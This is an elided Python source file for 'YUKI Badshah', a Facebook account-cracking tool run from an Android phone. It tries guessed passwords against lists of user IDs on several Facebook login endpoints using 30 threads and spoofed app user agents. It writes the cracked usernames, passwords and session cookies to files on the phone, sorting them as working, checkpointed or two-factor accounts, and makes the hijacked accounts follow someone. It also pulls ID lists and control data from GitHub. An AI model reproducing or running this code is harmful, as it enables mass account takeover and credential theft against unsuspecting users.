...
try:
    ...
    from concurrent.futures import ThreadPoolExecutor as YUKIBadshah
...
#gulo = 'https://'+'gi'+'th'+'ub'+'.co'+'m/'+'SH'+'OO'+'TE'+'R-'+'MA'+'KE'+'R/'+'YUKI'+'Bad'+'sh'+'ah'
#if not gulo in hulo:
#    os.system('clear')
#    print ('\n\n\n\n\nsomething wrong')
#    exit()
...
try:   
    def YUKI(user):
    if len(user)==15:
        if user[:10] in ['1000000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif user[:9] in ['100000000']       :creation = '\33[1;37m| \33[1;33m2009' 
        elif user[:8] in ['10000000']        :creation = '\33[1;37m| \33[1;33m2009' 
        elif user[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = '\33[1;37m| \33[1;33m2009' 
        elif user[:7] in ['1000006','1000007','1000008','1000009']:creation = '\33[1;37m| \33[1;33m2010' 
        elif user[:6] in ['100001']          :creation = '\33[1;37m| \33[1;33m2010\33[1;37m/\33[1;33m2011'
        elif user[:6] in ['100002','100003'] :creation = '\33[1;37m| \33[1;33m2011\33[1;37m/\33[1;33m2012'
        elif user[:6] in ['100004']          :creation = '\33[1;37m| \33[1;33m2012\33[1;37m/\33[1;33m2013'
        elif user[:6] in ['100005','100006'] :creation = '\33[1;37m| \33[1;33m2013\33[1;37m/\33[1;33m2014'
        elif user[:6] in ['100007','100008'] :creation = '\33[1;37m| \33[1;33m2014\33[1;37m/\33[1;33m2015'
        elif user[:6] in ['100009']          :creation = '\33[1;37m| \33[1;33m2015' 
        elif user[:5] in ['10001']           :creation = '\33[1;37m| \33[1;33m2015\33[1;37m/\33[1;33m2016'
        elif user[:5] in ['10002']           :creation = '\33[1;37m| \33[1;33m2016\33[1;37m/\33[1;33m2017'
        elif user[:5] in ['10003']           :creation = '\33[1;37m| \33[1;33m2018\33[1;37m/\33[1;33m2019'
        elif user[:5] in ['10004']           :creation = '\33[1;37m| \33[1;33m2019\33[1;37m/\33[1;33m2020'
        elif user[:5] in ['10005']           :creation = '\33[1;37m| \33[1;33m2020' 
        elif user[:5] in ['10006','10007','']:creation = '\33[1;37m| \33[1;33m2021' 
        elif user[:5] in ['10008']           :creation = '\33[1;37m| \33[1;33m2022' 
        else:creation=''
...
try:
    ...
    sys.exit()
if ATS not in __req:
    print ('\n\n You Cant recode it bro its YUKI Badshah Brand\n\nAdmin Contect Numbr 03007574310')
    exit()
if 'update' in __req:
...
\033[1;32m███     █▄ \033[1;15m   ▄█   ▄█▄ \033[1;92m   ▄█            =H=           =
 ...
 \033[1;32m                                                                                                                                                           
\x1b[1;92m      Y U K I H I R A    S E N
\x1b[1;91m-----------------------------------------------
\x1b[1;97m> Author : YukiSen
\x1b[1;97m> Github : https://github.com/YukihiraSen
\x1b[1;97m> Facebok: Rey Estacio
\x1b[1;97m> Version: 3.0
\x1b[1;91m-----------------------------------------------"""
...
class crack:
    ...
    def __passw__(self):
        ...
        if td == '1':
            ...
            print ('')
            try:
                r = requests.get('https://raw.githubusercontent.com/YukihiraSen/aup/main/auto').text
            except requests.exceptions.ConnectionError:
                os.system('clear')
                print (logo4)
        ...
        for pw in __juts__:
            try:
                ...
                if "c_user" in str(cok):
                    ...
                    print(f"\r{HH}[OK-YUKI] {user} | {pw} {VV}    ")
                    open("/sdcard/YUKI_OK.txt", "a").write(user + "|" + pw + "\n")
                    open("/sdcard/YUKI_cokie.txt", "a").write(user + "|" + pw + " | " + coki + "\n")
                    ok.append(user + pw)
                    self.follow(coki)
                    break
            ...
            try:
                ...
                if "c_user" in str(cok):
                    ...
                    if 'Enter login code to continue' in str(rex.text):
                        Mm = '\033[9;31m'
                        print(f"\r{Mm}[2F-YUKI] {user} | {pw}{VV}     ")
                        open("/sdcard/YUKI_2F.txt", "a").write(user + "|" + pw + "\n")
                        f2.append(user + pw)
                        break
                    else:
                        print(f"\r{BB}[CP-YUKI] {user} | {pw}{VV}     ")
                        open("/sdcard/YUKI_CP.txt", "a").write(user + "|" + pw + "\n")
                        cp.append(user + pw)
                        break
                else:
                    continue
            ...
            try:
                ...
                if 'session_key' in str(q) or 'c_user' in str(q):
                    ...
                    try:
                        ...
                        name=me['name']
                        idd=me['id']
                        print(f"\r{HH}[OK-YUKI] {used} | {pw} {VV}    ")
                        ...
                        print(f"\r\033[1;33m[TL-YUKI] {used} | {pw} {VV}    ")
                        tl.append(used + pw)
                        break
                    ...
                    if len(used)<11 or len(used)>15:
                        used = user
                    print(f"\r{Mm}[2F-YUKI] {used} | {pw}{VV}     ")
                    open("/sdcard/YUKI_2F.txt", "a").write(used + "|" + pw + "\n")
                    f2.append(used + pw)
                    break
                    ...
                    if 'uid' not in str(q) or 'skip_ixt_start_dialog' in str(q):
                        ...
                        print(f"\r{BB}[CP-YUKI] {used} | {pw} {VV}    ")
                        open("/sdcard/YUKI_CP.txt", "a").write(used + "|" + pw + "\n")
                        cp.append(used + pw)
                        break
                else:
                    continue
    ...
    def __mmb__(self,user,__juts__,_jat):
        ...
        for pw in __juts__:
            try:
                ...
                ua_string = f'[FBAN/FB4A;FBAV/4Q095MQG;FBBV/964982515;FBDM/'+'{density=2.75,width=1080,height=2131};FBLC/en_US;FBRV/366716093;FBCR/Telenor;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBBK/1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                device = str(uuid.uuid4())
                adid = str(uuid.uuid4())
                data = {
                    'adid':adid,
    ...
    def __pler_(self):
        ...
        if vz in ['1', '2', '3']:
            ...
            time.sleep(0.5)
            print (47*'-')
            print ('\x1b[1;92m   •Y U K I H I R A    S E N T I N E L•\x1b[1;97m')
            time.sleep(0.5)
            print (47*'-')
            with YUKIBadshah(max_workers=30) as (__YUKIbrand__):
                for YUKIxd in self.id:
                    try:
                        uid, name = YUKIxd.split('|')
                        xz = name.split(' ')
                        ...
                        if vz == '1' and uz == '1':
                            __YUKIbrand__.submit(self.__mbasic__,uid,pwx,"free.facebook.com")
                        elif vz == '1' and uz == '2':
                            __YUKIbrand__.submit(self.__mbasic__,uid,pwx,"p.facebook.com")
                        elif vz == '1' and uz == '3':
                            __YUKIbrand__.submit(self.__mbasic__,uid,pwx,"x.facebook.com")
                        elif vz == '2' and uz == '1':
                            __YUKIbrand__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '2' and uz == '2':
                            __YUKIbrand__.submit(self.__free__,uid,pwx,url2)
                        elif vz == '2' and uz == '3':
                            __YUKIbrand__.submit(self.__free__,uid,pwx,url1)
                        elif vz == '3' and uz == '1':
                            __YUKIbrand__.submit(self.__mmb__,uid,pwx,url1)
                        elif vz == '3' and uz == '2':
                            __YUKIbrand__.submit(self.__mmb__,uid,pwx,url2)
                        elif vz == '3' and uz == '3':
                            __YUKIbrand__.submit(self.__mmb__,uid,pwx,url1)
                        else:
                            __YUKIbrand__.submit(self.__mbasic__,uid,pwx,'p.facebook.com')
                ...
                with YUKIBadshah(max_workers=30) as (__YUKIbrand__):
                    for YUKIxd in self.id:
                        try:
                            ...
                            url3 = 'https://b-api.facebook.com/method/auth.login'
                            if vz == '1' and uz == '1':
                                __YUKIbrand__.submit(self.__randoms__,uid,pwx,"p.facebook.com")
                            elif vz == '1' and uz == '2':
                                __YUKIbrand__.submit(self.__randoms__,uid,pwx,"x.facebook.com")
                            elif vz == '1' and uz == '3':
                                __YUKIbrand__.submit(self.__randoms__,uid,pwx,"free.facebook.com")
                            elif vz == '2' and uz == '1':
                                __YUKIbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '2':
                                __YUKIbrand__.submit(self.__free__,uid,pwx,url1)
                            elif vz == '2' and uz == '3':
                                __YUKIbrand__.submit(self.__free__,uid,pwx,url3)
                            elif vz == '3' and uz == '1':
                                __YUKIbrand__.submit(self.__mmb__,uid,pwx,url1)
                            elif vz == '3' and uz == '2':
                                __YUKIbrand__.submit(self.__mmb__,uid,pwx,url2)
                            elif vz == '3' and uz == '3':
                                __YUKIbrand__.submit(self.__mmb__,uid,pwx,url3)
                            else:
                                __YUKIbrand__.submit(self.__free__,uid,pwx,url1)
                        except:
                            pass
...
def lolex():
    ...
    os.system('clear')
    print (logo4)
    print ('\033[1;33mFor Example /sdcard/YUKI.txt etc...\033[0;97m')
    print (47*'-')
...
def oldex():
    ...
    print (logo4)
    print ('')
    print ('\033[1;33mFor Example /sdcard/YUKI.txt\033[0;97m')
    print ('')
    fp = input('\033[1;32mOutput Save File Name: \033[0;97m')
    if '/sdcard/' in fp:
...
def autofile():
    ...
    os.system('rm -rf .out*')
    try:
        rgb = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/YUKIbrand/main/ids.txt').text
    ...
    os.system('clear')
    print (logo4)
    print ('\033[1;33mExample /sdcard/YUKI.txt\033[0;97m')
    print (47*'-')
...
def double():
    ...
    if sf == ' ' or sf == '':
        main_menu()
    print ('\033[1;33mFor Example /sdcard/YUKI.txt')
